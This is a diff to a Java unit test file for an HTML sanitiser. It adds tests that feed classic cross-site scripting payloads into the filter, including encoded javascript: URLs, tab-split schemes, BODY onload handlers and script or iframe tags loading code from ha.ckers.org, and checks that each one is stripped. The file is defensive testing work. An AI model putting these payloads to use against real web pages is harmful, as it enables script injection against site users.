@@ -41,16 +41,21 @@ public class HtmlFilterTest {
 	public void testCleanHtml() {
 		String html = "Hello <b>world</b>!";
 		String cleanHtml = underTest.filter(html).html();
-		assertEquals(HEADER + "Hello <b>world</b>!" + FOOTER,
-				stripNewlines(cleanHtml));
+		assertEquals(HEADER + "Hello <b>world</b>!" + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testCleanHtmlImage() {
+		String html = "<img src=\"http://www.fhnw.ch/logo.png\" />";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(HEADER + "<img src=\"http://www.fhnw.ch/logo.png\" />" + FOOTER, stripNewlines(cleanHtml));
 	}
 
 	@Test
 	public void testXssLocator2() {
 		String html = "'';!--\"<XSS>=&{()}";
 		String cleanHtml = underTest.filter(html).html();
-		assertNotSame(HEADER + "<XSS verses &lt;XSS" + FOOTER,
-				stripNewlines(cleanHtml));
+		assertNotSame(HEADER + "<XSS verses &lt;XSS" + FOOTER, stripNewlines(cleanHtml));
 	}
 
 	@Test
@@ -125,6 +130,119 @@ public class HtmlFilterTest {
 				      "&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>";
 		String cleanHtml = underTest.filter(html).html();
 		assertEquals(HEADER + BLANK_IMAGE + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testHexEncodingWithoutSemicolons() {
+		String html = "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65" +
+					  "&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(HEADER + BLANK_IMAGE + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testEmbeddedTab() {
+		String html = "<IMG SRC=\"jav	ascript:alert('XSS');\">";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(HEADER + BLANK_IMAGE + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testEmbeddedEncodedTab() {
+		String html = "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(HEADER + BLANK_IMAGE + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testEmbeddedNewlineToBreakUpXss() {
+		String html = "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(HEADER + BLANK_IMAGE + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testNonAlphaNonDigitXss1() {
+		String html = "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testNonAlphaNonDigitXss2() {
+		String html = "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testNonAlphaNonDigitXss3() {
+		String html = "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testExtraneousOpenBrackets() {
+		String html = "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(HEADER + "&lt;" + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testNoClosingScriptTags() {
+		String html = "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testProtocolResolutionInScriptTags() {
+		String html = "<SCRIPT SRC=//ha.ckers.org/.j>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testHalfOpenHtmlJavaScriptXssVector() {
+		String html = "<IMG SRC=\"javascript:alert('XSS')\"";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testDoubleOpenAngleBrackets() {
+		String html = "<iframe src=http://ha.ckers.org/scriptlet.html <";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testBodyImage() {
+		String html = "<BODY BACKGROUND=\"javascript:alert('XSS')\">";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testImgDynsrc() {
+		String html = "<IMG DYNSRC=\"javascript:alert('XSS')\">";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(HEADER + "<img />" + FOOTER, stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testListStyleImage() {
+		String html = "<STYLE>li {list-style-image: url(\"javascript:alert(2 * 3)\");}</STYLE><UL><LI>Test</br>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals("<html><head><style></style></head><body><ul><li>Test<br /></li></ul></body></html>", stripNewlines(cleanHtml));
+	}
+	
+	@Test
+	public void testBodyTag() {
+		String html = "<BODY ONLOAD=alert('XSS')>";
+		String cleanHtml = underTest.filter(html).html();
+		assertEquals(BLANK_HTML_SITE, stripNewlines(cleanHtml));
 	}
 	
 	
